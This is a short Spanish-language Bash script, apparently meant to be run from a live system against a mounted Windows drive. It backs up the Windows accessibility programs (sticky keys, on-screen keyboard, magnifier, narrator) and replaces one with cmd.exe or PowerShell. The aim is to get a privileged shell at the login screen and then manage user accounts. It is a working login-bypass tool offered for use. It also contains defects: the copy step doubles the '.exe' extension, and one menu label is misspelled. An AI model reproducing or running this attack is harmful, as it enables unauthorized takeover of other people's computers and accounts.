#! /usr/bin/env bash
# -*- coding: utf-8 -*-

clear
echo " *** Hackear Windows Cambiar * por el CMD/PowerShell *** "
echo " SELECCIONA UNA OPCION: "
echo " 1.-Command Prompt (cmd.exe)"
echo " 2.-PowerShell CLI (powershell.exe)"
echo " 3.-PowerShell GUI (powershell_ise.exe)"
echo " 0.-Salir"
echo " "
read -p "OPCIÓN: " OPCION0
echo " "
echo " SELECCIONA UNA OPCION:"
echo " 1.-Hackear por ost.exe (Teclado Virtual)"
echo " 2.-Hackear por sethc.exe (Teclas Especiales)"
echo " 3.-Hackear por magnify.exe (Lupa)"
echo " 4.-Hackear por Narrator.exe (Narrador)"
echo " 0.-Salir"
echo " "
read -p "OPCIÓN: " OPCION1
echo " "
read -p "Ruta Windows: " RUTA



case $OPCION0 in
	0)	exit;;
	1) CONSOLA="cmd.exe";;
	2) CONSOLA="WindowsPowerShell/v1.0/powershell.exe";;
	3) CONSOLA="WindowsPowerShell/v1.0/powershell_ise.exe";;
	*) echo "Error: Opcion no valida. Saliendo"; exit 1 ;;
	:) echo "Error: Está faltando un argumento en alguna parte. Saliendo"; exit 1 ;;
	?) echo "Error: Indicador no válido en alguna parte. Saliendo"; exit 1 ;;
esac
case $OPCION1 in
	0)	exit;;
	1)	ATAJO="osk.exe";;
	2)	ATAJO="sethc.exe";;
	3)	ATAJO="magnify.exe";;
	4)	ATAJO="Narrator.exe";;
	*) echo "Error: Opcion no valida. Saliendo"; exit 1 ;;
	:) echo "Error: Está faltando un argumento en alguna parte. Saliendo"; exit 1 ;;
	?) echo "Error: Indicador no válido en alguna parte. Saliendo"; exit 1 ;;
esac

cd $RUTA
mv ./Windows/System32/$CONSOLA ./Windows/System32/$CONSOLA.bak
mv ./Windows/System32/$ATAJO ./Windows/System32/$ATAJO.bak
cp ./Windows/System32/$CONSOLA.bak ./Windows/System32/$ATAJO.exe

echo " COMPLETADO:"
echo " Ejemplos:"
echo " control"
echo " lusrmgr.msc"
echo " "
echo " "
echo " "
echo " "

exit 0
